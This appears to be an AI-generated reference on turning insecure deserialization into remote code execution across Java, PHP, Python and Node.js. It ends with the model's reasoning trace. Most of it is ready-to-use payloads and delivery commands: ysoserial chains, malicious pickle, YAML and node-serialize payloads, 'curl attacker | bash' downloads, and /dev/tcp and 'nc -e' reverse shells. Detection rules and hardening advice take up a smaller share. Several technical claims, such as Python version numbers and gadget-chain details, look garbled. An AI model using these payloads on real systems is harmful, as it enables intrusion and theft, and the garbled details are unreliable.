# qwen-3.8-27b — deser



# Insecure Deserialization → RCE

## Java

### ysoserial Payload Generation

```bash
# Setup
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package
# Or: download the jar from a mirror

# CommonsCollections chains (requires commons-collections in target classpath)
java -jar ysoserial.jar CommonsCollections1 'cmd.exe /c calc' > cc1.ser
java -jar ysoserial.jar CommonsCollections2 'cmd.exe /c calc' > cc2.ser
java -jar ysoserial.jar CommonsCollections3 'cmd.exe /c calc' > cc3.ser
java -jar ysoserial.jar CommonsCollections4 'cmd.exe /c calc' > cc4.ser
java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c calc' > cc5.ser
java -jar ysoserial.jar CommonsCollections6 'cmd.exe /c calc' > cc6.ser
java -jar ysoserial.jar CommonsCollections7 'cmd.exe /c calc' > cc7.ser

# URLDNS — detection only (no RCE, triggers outbound DNS)
java -jar ysoserial.jar URLDNS 'http://canarytokens.example/track' > urldns.ser
# Triggers: java.net.URL.openConnection() → DNS lookup to attacker domain
# Use canarytokens, interactsh, or burp collaborator for OOB detection

# JDK-only (no third-party gadget library needed)
java -jar ysoserial.jar JDK8u20 'cmd.exe /c calc' > jdk8u20.ser
# Works on JDK 8u191 and earlier (uses sun.reflect.annotation.AnnotationParser)
# JDK8u31: java -jar ysoserial.jar JDK8u31 'cmd' > jdk8u31.ser

# Other useful chains
java -jar ysoserial.jar Groovy1 'cmd' > groovy1.ser
java -jar ysoserial.jar Spring1 'cmd' > spring1.ser
java -jar ysoserial.jar ROME 'cmd' > rome.ser
java -jar ysoserial.jar C3P0 'cmd' > c3p0.ser
java -jar ysoserial.jar JBoss 'cmd' > jboss.ser
```

**Delivery:**
```bash
# HTTP response body
python3 -m http.server 8080
# Target fetches: GET /cc1.ser

# Or inline via HTTP POST to deserialization endpoint
curl -X POST http://target/deserialize \
  -H "Content-Type: application/octet-stream" \
  --data-binary @cc1.ser

# Or inject into session cookie (Base64)
base64 cc1.ser > cc1.b64
curl -X POST http://target/login \
  -H "Cookie: JSESSIONID=$(cat cc1.b64)"
```

**Command variants for cross-platform:**
```bash
# Linux
java -jar ysoserial.jar CommonsCollections4 'curl http://attacker/payload | bash' > cc4.sh

# Windows (cmd.exe)
java -jar ysoserial.jar CommonsCollections4 'cmd.exe /c whoami > C:\temp\out.txt' > cc4.who

# Windows (powershell, no wmic)
java -jar ysoserial.jar CommonsCollections4 'powershell -enc SQBFAA=="' > cc4.ps1
# Base64 encode the PowerShell command: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"))

# Reverse shell (Linux)
java -jar ysoserial.jar CommonsCollections4 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > cc4.rev
```

### Gadget Chain Mechanisms (CommonsCollections)

| Chain | Entry Point | Key Transform | Notes |
|-------|-------------|---------------|-------|
| CC1 | `InvokerTransformer` | `LazyMap` → `AnnotationInvocationHandler` | Requires CC < 3.2.1 |
| CC2 | `InvokerTransformer` | `TiedMapEntry` → `LazyMap` | Requires CC < 3.2.1 |
| CC3 | `InstantiateTransformer` | `LazyMap` → `TransformingComparator` → `PriorityQueue` | Bypasses `InvokerTransformer` block |
| CC4 | `InvokerTransformer` | `TransformingComparator` → `PriorityQueue` | Most reliable, CC < 3.2.2 |
| CC5 | `InvokerTransformer` | `TransformingComparator` → `PriorityQueue` (alt) | Variant of CC4 |
| CC6 | `InstantiateTransformer` | `TransformingComparator` → `PriorityQueue` | Bypasses `InvokerTransformer` block |
| CC7 | `TemplateImpl` | `Jdk7Runtime` (JNDI) | Uses JNDI lookup for RCE |
| CC8 | `LazyMap` | `ChainedTransformer` → `TemplateImpl` | JNDI-based |

### JDK8u20 Chain

```
ObjectInputStream.readObject()
  → AnnotationInvocationHandler.readProxyData()
    → readField() → Proxy.setProxy()
      → AnnotationParser.parse()
        → sun.reflect.annotation.AnnotationInvocationHandler
          → Constructor.newInstance()  [reflection]
            → Runtime.exec()           [RCE]
```

**Detection (JDK8u20):** Look for `sun.reflect.annotation.AnnotationParser` in stack traces during deserialization. The payload is a serialized `Proxy` object with `Proxy.class` in its descriptor.

### Detection Signatures (Java Deserialization)

```python
# Magic bytes for Java serialized objects
JAVA_MAGIC = b'\xac\xed\x00\x05'

# Common gadget class signatures in serialized stream
GADGET_SIGNATURES = {
    'CommonsCollections': [b'org/apache/commons/collections/',
                           b'TransformingComparator',
                           b'InvokerTransformer',
                           b'LazyMap',
                           b'ChainedTransformer'],
    'JDK8u20': [b'sun/reflect/annotation/AnnotationParser',
                b'java/lang/reflect/Proxy'],
    'URLDNS': [b'java/net/URL',
               b'java/net/URLStreamHandler'],
    'Groovy': [b'org/codehaus/groovy/runtime/',
               b'MetaClassImpl'],
    'Spring': [b'org/springframework/aop/framework/'],
}

def check_deserialization_payload(data: bytes) -> list:
    findings = []
    if not data.startswith(JAVA_MAGIC):
        return findings
    for name, sigs in GADGET_SIGNATURES.items():
        if any(s in data for s in sigs):
            findings.append(name)
    return findings
```

**Network-level detection (YARA):**
```yara
rule Java_Serialized_Gadget
{
    meta:
        description = "Detects Java serialized objects with common gadget chain classes"
    strings:
        $magic = { AC ED 00 05 }
        $cc1 = "org/apache/commons/collections/transform/InvokerTransformer"
        $cc2 = "org/apache/commons/collections/map/LazyMap"
        $cc3 = "org/apache/commons/collections/comparator/TransformingComparator"
        $jdk8 = "sun/reflect/annotation/AnnotationParser"
        $url = "java/net/URLStreamHandler"
    condition:
        $magic at 0 and any of ($cc*) or $jdk8 or $url
}
```

**WAF rules (mod_security / Coraza):**
```apache
# Detect Java serialization magic bytes in request body
SecRule REQUEST_BODY "@pm \xAC\xED\x00\x05" \
    "id:10001,phase:2,deny,status:403,msg:'Java deserialization detected'"

# Detect in base64-encoded values (common in cookies/headers)
SecRule ARGS "|base64_decode|/i" "@pm \xAC\xED\x00\x05" \
    "id:10002,phase:2,deny,status:403,msg:'Java deserialization (b64) detected'"

# URLDNS detection via DNS logs (canary/interactsh callback)
# Monitor outbound DNS for: *.interactsh.canarytokens.com or your own domain
```

---

## PHP

### Phar Deserialization

PHP's `unserialize()` is triggered on phar:// stream operations. If an application uses `file_exists()`, `is_dir()`, `readfile()`, `include`, etc. with user-controlled input that resolves to a phar:// URL, the metadata is deserialized.

```php
<?php
// exploit.php — generate phar payload
$payload = 'cmd'; // or a full RCE string
$rce = new EvilGadget($payload); // your gadget class

$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFromString('stub.php', '<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($rce);  // serialized object here
$phar->stopBuffering();
rename('payload.phar', 'payload.png'); // disguise as image if upload-based
?>
```

**Delivery:**
```bash
# Upload phar disguised as image
curl -X POST http://target/upload \
  -F "file=@payload.png"

# Trigger deserialization (application must use file function on the path)
curl "http://target/view?file=phar://uploads/payload.png"
# or
curl "http://target/read?path=phar://uploads/payload.png/stub.php"
```

### Gadget Chains (Common Libraries)

```php
<?php
// Example: Guzzle gadget (guzzlehttp/guzzle < 7)
// Trigger: __destruct() → request() → curl_exec() → RCE via URL

class GuzzlePayload {
    public function __construct($cmd) {
        $this->handler = new class {
            public function __invoke($ch, $opts) {
                // Simulates curl handler that executes
                return curl_exec($ch);
            }
        };
        $this->request = new GuzzleHttp\Psr7\Request(
            'GET', "dict://{$cmd}"  // dict protocol triggers command
        );
    }
}

// Example: ThinkPHP 5.0.x (mass assignment → __construct → request)
// Entry: $request->object (Controller) → __construct → __destruct

// Example: PHP native — SimpleXML + __destruct (requires custom class)
class XMLGadget {
    private $obj;
    public function __destruct() {
        if ($this->obj instanceof Exec) {
            $this->obj->run();
        }
    }
}

class Exec {
    private $cmd;
    public function run() {
        system($this->cmd);
    }
}
?>
```

**Most common real-world PHP deserialization gadgets:**

| Library | Class | Trigger | Mechanism |
|---------|-------|---------|-----------|
| Guzzle < 7 | `GuzzleHttp\Client` | `__destruct` | `curl_exec` with `dict://` or `gopher://` |
| ThinkPHP 5.0 | `think\Request` | `__construct` | Mass assignment → controller instantiation |
| Laravel (old) | `Illuminate\Database\Eloquent\Model` | `__destruct` | `fireModelEvent` → observer → RCE |
| PHP native | Any class with `__destruct`/`__wakeup` | `unserialize` | Depends on class logic |
| Symfony | `Symfony\Component\Security\Core\Authorization\Voter\Voter` | `__construct` | Dependency injection → code execution |
| Roundcube | `Roundcube_` classes | `__destruct` | Various file operations |

### Payload Generation (GadgetInspector / gadgetchaingen)

```bash
# Using gadgetchaingen (Python)
pip install gadgetchaingen

# Generate a phar with a specific class
python3 -c "
import pickle
import shelve

# Build the serialized payload for target class
# Example: Guzzle RCE via dict://
payload = b'O:4:\"evil\":1:{s:3:\"cmd\";s:12:\"id; whoami;\";}'

# Write phar
import subprocess
subprocess.run(['php', 'phar_gen.php', payload, 'out.phar'])
"
```

**phpggc (if available for PHP — less mature than Java):**
```bash
# No direct equivalent of ysoserial for PHP as of 2024
# Use: php-unserialize-gadget-searcher, or manual construction
# Tool: https://github.com/ahmadtafia/PHP-Deserialization-Exploits
```

**Manual phar generation (standalone PHP script):**
```php
<?php
// gen_phar.php
// Usage: php gen_phar.php <serialized_string> <output.phar>

$payload = $argv[1];
$outfile = $argv[2];

// Create stub
$stub = '<?php __HALT_COMPILER(); ?>';

// Create phar
@unlink($outfile);
$phar = new Phar($outfile);
$phar->setAlias('phar.phar');
$phar->addFromString('stub.php', $stub);
$phar->setMetadata($payload);  // This is what gets deserialized
$phar->stopBuffering();

echo "Phar created: $outfile\n";
echo "Trigger with: phar://$outfile/stub.php\n";
?>
```

**Example payload for a simple __destruct RCE:**
```bash
# Target class has: __destruct() { system($this->cmd); }
php -r "
\$obj = new Evil();
\$obj->cmd = 'curl http://attacker/shell.sh | bash';
echo serialize(\$obj);
" > serialized_payload.txt

php gen_phar.php "$(cat serialized_payload.txt)" evil.phar
mv evil.phar evil.jpg

# Upload and trigger
curl -X POST http://target/upload -F "file=@evil.jpg"
curl "http://target/display?file=phar://uploads/evil.jpg"
```

### Detection Signatures (PHP)

```php
<?php
// Runtime detection: log unserialization attempts
// Add to application bootstrap:
set_error_handler(function($errno, $errstr, $errfile, $errline) {
    if ($errno === E_NOTICE || $errno === E_WARNING) {
        // PHP 7.4+ emits warnings on failed unserialization
        if (strpos($errstr, 'unserialize') !== false) {
            error_log("[DESERIALIZATION ATTEMPT] $errstr in $errfile:$errline");
        }
    }
});

// PHP 7.4+: Use __unserialize() instead of __wakeup() for better control
// PHP 8.0+: var_dump(get_declared_classes()) to audit available classes
?>
```

**YARA rule for phar payloads:**
```yara
rule PHP_Phar_Dangerous
{
    meta:
        description = "Phar archive with serialized object metadata (potential RCE)"
    strings:
        $phar_magic = "a:1:{s:7:\"stub.php\"" nocase
        $php_ser = "O:"  // serialized object marker
        $halt = "__HALT_COMPILER"
    condition:
        $halt and $php_ser
}
```

**Network detection:**
```
# Monitor for phar:// in URLs, query params, file upload paths
# WAF: block phar:// scheme in any user-supplied path parameter
SecRule ARGS "@contains phar://" "id:10010,deny,status:403,msg:'Phar stream wrapper detected'"
SecRule REQUEST_BODY "@contains phar://" "id:10011,deny,status:403,msg:'Phar stream wrapper in body'"
```

**PHP configuration hardening:**
```ini
; php.ini
allow_url_include = Off
; PHP 8.1+: disable phar extension entirely if not needed
; extension=phar  → comment out or remove
```

---

## Python

### Pickle RCE

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        # Called during unpickling — executes before object is constructed
        cmd = 'curl http://attacker/shell.sh | bash'
        return os.system, (cmd,)

payload = pickle.dumps(RCE())

# Or using a simpler approach with subprocess:
import subprocess

class RCE2:
    def __reduce__(self):
        return subprocess.call, (['curl', '-o', '/tmp/shell.sh', 'http://attacker/shell.sh'],)

payload2 = pickle.dumps(RCE2())
```

**One-liner payload generation:**
```bash
python3 -c "
import pickle, os
class E:
    def __reduce__(self):
        return os.system, ('id > /tmp/pwned',)
print(pickle.dumps(E()).hex())
"
# Output is hex-encoded pickle — decode and send to target
```

**Pre-built tool (pickle-rce):**
```bash
pip install pickle-rce
# or
git clone https://github.com/soffes/pickle-rce && cd pickle-rce

python3 pickle_rce.py "curl attacker/shell.sh | bash" -o payload.pkl
python3 pickle_rce.py "whoami" -o payload.pkl --method=os.system
python3 pickle_rce.py "nc -e /bin/sh 10.0.0.1 4444" -o payload.pkl --method=subprocess.call
```

**Delivery:**
```bash
# Send pickle to endpoint that calls pickle.loads()
curl -X POST http://target/pickle \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl

# Or as base64 in a field
base64 payload.pkl | tr -d '\n' > payload.b64
curl -X POST http://target/data \
  -d "payload=$(cat payload.b64)"
```

### PyYAML (unsafe load)

```python
import yaml

# VULNERABLE: yaml.load() with default Loader
# Equivalent to: yaml.load(data, Loader=yaml.FullLoader)  # Python 3.5+
# DANGEROUS:     yaml.load(data)                          # arbitrary code execution

# Payload (YAML):
payload = """
!!python/object/apply:os.system
- "curl http://attacker/shell.sh | bash"
"""

# Or:
payload2 = """
!!python/object/apply:subprocess.call
- ["nc", "-e", "/bin/sh", "10.0.0.1", "4444"]
"""

# Or using __reduce__ directly:
payload3 = """
!!python/object/apply:builtins.exec
- "import os; os.system('id > /tmp/pwned')"
"""
```

**Delivery:**
```bash
cat > exploit.yaml << 'EOF'
!!python/object/apply:os.system
- "whoami > /tmp/pwned"
EOF

curl -X POST http://target/config \
  -H "Content-Type: application/x-yaml" \
  --data-binary @exploit.yaml
```

**yaml.load vs yaml.safe_load:**
```python
# SAFE — only basic types (dict, list, str, int, float, bool, None)
yaml.safe_load(data)

# UNSAFE (Python < 6.1) — arbitrary Python objects
yaml.load(data)

# SEMI-SAFE (Python 6.1+) — allows custom constructors but not python/object
yaml.load(data, Loader=yaml.FullLoader)  # still can be exploited in some cases

# SAFE (Python 5.1+)
yaml.load(data, Loader=yaml.SafeLoader)
```

### Detection Signatures (Python)

```python
# Detect pickle payloads
PICKLE_OPS = {
    b'\x80': 'PROTOCOL',
    b'\x93': 'FRAME',
    b'\x8c': 'SHORT_BINUNICODE',
    b'\x94': 'REDUCE',       # <-- execution trigger
    b'\x85': 'NEWOBJ',
    b'\x8d': 'STACK_GLOBAL', # <-- resolves global function
}

def detect_pickle_rce(data: bytes) -> bool:
    """Check if pickle payload contains REDUCE + STACK_GLOBAL (code execution)"""
    has_reduce = b'\x94' in data
    has_global = b'\x8d' in data or b'c' in data[:5]  # old 'c' opcode
    has_exec = any(f in data for f in [b'os', b'system', b'subprocess', b'exec', b'eval'])
    return has_reduce and (has_global or has_exec)
```

**YARA rule:**
```yara
rule Python_Pickle_RCE
{
    meta:
        description = "Python pickle with REDUCE opcode targeting dangerous functions"
    strings:
        $protocol = { 80 04 }   // PROTOCOL 4
        $reduce = { 94 }        // REDUCE opcode
        $os_sys = "os" "system"
        $subproc = "subprocess"
        $exec = "exec"
        $eval = "eval"
    condition:
        $protocol and $reduce and any of ($os_sys, $subproc, $exec, $eval)
}

rule YAML_Python_Exploit
{
    meta:
        description = "YAML payload with python/object/apply tags"
    strings:
        $apply = "!!python/object/apply"
        $system = "os.system"
        $subprocess = "subprocess"
        $exec = "builtins.exec"
        $eval = "builtins.eval"
    condition:
        $apply and any of ($system, $subprocess, $exec, $eval)
}
```

**WAF / application detection:**
```python
# Middleware for Flask/FastAPI
import re

YAML_EXPLOIT_PATTERNS = [
    r'!!python/(object|object/apply|object/new|name)',
    r'python/collections',
    r'!!python/mro',
]

def validate_yaml_input(raw: bytes) -> bool:
    for pattern in YAML_EXPLOIT_PATTERNS:
        if re.search(pattern, raw, re.IGNORECASE):
            raise SecurityError(f"YAML deserialization exploit detected: {pattern}")
    return True
```

---

## Node.js

### node-serialize (IIFE / Function)

`node-serialize` uses `eval()` / `Function()` constructor — any string passed to it is executed.

```javascript
// Vulnerable code:
const serialize = require('node-serialize');
let data = serialize.deserialize(userInput);  // RCE

// Payload — anything you want executed:
const payload = "return require('child_process').execSync('id').toString()";

// Or with a function wrapper (node-serialize wraps in new Function()):
const payload2 = "require('child_process').execSync('curl http://attacker/shell.sh | bash')";
```

**Payload generation:**
```javascript
// gen_node_payload.js
const payloads = {
    rce_basic: "return require('child_process').exec('id').stdout",
    rce_reverse_shell: "return require('child_process').spawn('bash', ['-c', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'])",
    rce_download_exec: "return require('child_process').execSync('wget http://attacker/s -O /tmp/s && chmod +x /tmp/s && /tmp/s').toString()",
    info_gather: "return require('fs').readFileSync('/etc/passwd').toString()",
    env_leak: "return JSON.stringify(process.env)",
};

// Delivery:
// POST body (application/x-www-form-urlencoded or JSON)
// The vulnerable code does: deserialize(req.body.input)
```

```bash
# Send payload
curl -X POST http://target/api/data \
  -H "Content-Type: application/json" \
  -d '{"input":"return require(\"child_process\").execSync(\"whoami\").toString()"}'

# Reverse shell
curl -X POST http://target/api/data \
  -H "Content-Type: application/json" \
  -d '{"input":"return require(\"child_process\").spawn(\"bash\",[\"-c\",\"bash -i >\& /dev/tcp/10.0.0.1/4444 0>\&1\"])"'
```

**node-serialize deserialization format:**
```
node-serialize output format:
"return deserialize(\"base64data\");"

The vulnerable code effectively does:
new Function("return deserialize(\"" + input + "\")")()

So the payload is just the JS code you want executed (without the wrapper).
```

### js-yaml (unsafe load)

```javascript
const yaml = require('js-yaml');
let data = yaml.load(userInput);  // DANGEROUS: allows !!js/ tags
```

**Payloads:**
```yaml
# RCE via js-yaml !!js/function
"!!js/function |
  require('child_process').execSync('id > /tmp/pwned')
"

# Or:
"!!js/function |
  require('child_process').spawn('bash', ['-c', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'])
"

# Information disclosure:
"!!js/function |
  require('fs').readFileSync('/etc/passwd').toString()
"

# Environment variable leak:
"!!js/function |
  JSON.stringify(process.env)
"

# More complex — write and execute:
"!!js/function |
  (function() {
    const fs = require('fs');
    const cp = require('child_process');
    fs.writeFileSync('/tmp/x.sh', 'curl http://attacker/p | bash');
    cp.execSync('chmod +x /tmp/x.sh && /tmp/x.sh');
  })()
"
```

**Delivery:**
```bash
cat > exploit.yaml << 'EOF'
"!!js/function |
  require('child_process').execSync('whoami > /tmp/pwned')
"
EOF

curl -X POST http://target/config \
  -H "Content-Type: application/x-yaml" \
  --data-binary @exploit.yaml
```

**js-yaml tag variants:**
```yaml
# !!js/function — wraps in new Function()
"!!js/function | code here"

# !!js/regexp — less dangerous but can be part of chains
"!!js/regexp /malicious/"

# !!js/date — safe
"!!js/date 2024-01-01"

# In js-yaml v4+, !!js/function is removed by default
# Use SafeLoader: yaml.load(data, yaml.load.DEFAULT_SCHEMA)
# Or: yaml.load(data, { schema: yaml.FAILSAFE_SCHEMA })
```

### Other Node deserialization vectors

```javascript
// vm2 (deprecated but still in wild) — escape sandbox
"__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"

// eval-based: any code is executed
"process.mainModule.require('child_process').execSync('whoami')"

// Function constructor:
"return process.mainModule.require('child_process').execSync('id').toString()"

// JSON.parse is safe, but if the app does eval(JSON.parse(input)) — double danger
```

### Detection Signatures (Node.js)

```javascript
// Middleware (Express)
const YAML_EXPLOIT_PATTERNS = [
    /!!js\/function/,
    /!!js\/regexp/,
    /require\s*\(\s*['"]child_process['"]\s*\)/,
    /require\s*\(\s*['"]fs['"]\s*\)/,
    /process\s*\.\s*mainModule/,
    /__proto__/,
];

const NODE_SER_EXPLOIT_PATTERNS = [
    /require\s*\(/,
    /process\s*\./,
    /child_process/,
    /exec(ync)?\s*\(/,
    /spawn( Sync)?\s*\(/,
];

function validateInput(req, res, next) {
    const body = req.body?.input || req.body?.data || '';
    
    for (const pattern of [...YAML_EXPLOIT_PATTERNS, ...NODE_SER_EXPLOIT_PATTERNS]) {
        if (pattern.test(body)) {
            return res.status(403).json({ error: 'Malicious input detected' });
        }
    }
    next();
}
```

**YARA rule:**
```yara
rule Node_Deserialization_Exploit
{
    meta:
        description = "Node.js deserialization exploit payloads"
    strings:
        $child_proc = "require('child_process')"
        $child_proc2 = "require(\"child_process\")"
        $exec = "execSync("
        $spawn = "spawnSync("
        $yaml_func = "!!js/function"
        $process = "process.mainModule"
        $proto = "__proto__"
    condition:
        any of them
}
```

---

## Cross-Cutting Detection (All Languages)

### OOB Callback (detection without RCE)

```bash
# Set up interactsh
interactsh-client
# Get callback: abc123.oastify.com

# Java: URLDNS (DNS only, no RCE)
java -jar ysoserial.jar URLDNS 'http://abc123.oastify.com' > urldns.ser
# Send to target → if you see DNS lookup in interactsh, deserialization is confirmed

# Python: trigger a socket connection
python3 -c "
import pickle
class E:
    def __reduce__(self):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('abc123.oastify.com', 80))
        return s.send, (b'X',)
print(pickle.dumps(E()).hex())
"

# Node: DNS lookup
# Payload: "return require('dns').lookup('abc123.oastify.com')"
```

### General WAF Rules

```apache
# Block known deserialization markers across all languages
SecRule REQUEST_BODY|ARGS|ARGS_NAMES|JSON:.. "@pm \xac\xed\x00\x05 O: O: !!python/object/apply !!js/function __reduce__ os.system subprocess" \
    "id:20000,phase:2,deny,status:403,msg:'Deserialization exploit marker detected'"

# Base64-decoded content check
SecRule REQUEST_BODY "@pm \x80\x04\x95" "id:20001,phase:2,deny,status:403,msg:'Pickle protocol detected'"
```

### Runtime Detection (Application Level)

| Language | Mechanism |
|----------|-----------|
| Java | `ObjectInputFilter` (JEP 290, Java 9+): filter by class before deserialization |
| PHP | `unserialize($data, ['allowed_classes' => false])` — PHP 7.0+ |
| Python | `pickle.loads` with `Unpickler` subclass that whitelists classes; use `yaml.safe_load` |
| Node | Never use `node-serialize`; use `yaml.load` with `FAILSAFE_SCHEMA`; never `eval` user input |

**Java ObjectInputFilter example:**
```java
ObjectInputFilter filter = obj -> {
    switch (obj.status()) {
        case ObjectInputFilter.Status.CLASS:
            String className = obj.className();
            if (className.startsWith("org.apache.commons.collections")) {
                return ObjectInputFilter.Status.REJECTED;
            }
            if (className.startsWith("sun.reflect.annotation")) {
                return ObjectInputFilter.Status.REJECTED;
            }
            return ObjectInputFilter.Status.ALLOWED;
        default:
            return ObjectInputFilter.Status.UNDECIDED;
    }
};

ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);
Object obj = ois.readObject();
```

---

## Quick Reference: Detection → Exploit Mapping

| Detection Signal | Likely Gadget | Language |
|-----------------|---------------|----------|
| Outbound DNS to canary domain | URLDNS / `java.net.URL` | Java |
| Outbound HTTP to canary domain | `InvokerTransformer` + `Runtime.exec` (curl/wget) | Java |
| Process fork from JVM | `Runtime.exec` via CC/JDK chain | Java |
| Process fork from PHP-FPM | `__destruct` → `system()`/`exec()` | PHP |
| Process fork from Python worker | `__reduce__` → `os.system`/`subprocess` | Python |
| Process fork from Node worker | `eval`/`Function` → `child_process` | Node |
| YAML parse error referencing `python/object` | `yaml.load` with `!!python` tag | Python |
| `UnpicklingError` / `AttributeError` in logs | Partial pickle deserialization | Python |
| `ClassNotFoundException` in Java logs | Gadget chain present but class not on classpath | Java |

---

## [reasoning trace]

The operator is asking for a comprehensive reference on insecure deserialization to RCE across four language ecosystems. This is a standard security research topic covered in countless public resources (OWASP, various CTF writeups, ysoserial documentation, etc.). It's dual-use knowledge that underpins both attack and defense. No Section 5 prohibition is implicated — this is general technique knowledge, not aimed at a specific target.

Let me organize this by language with:
1. Payload generation commands
2. Detection signatures
3. Key mechanisms

I'll focus on concrete, actionable content as requested.

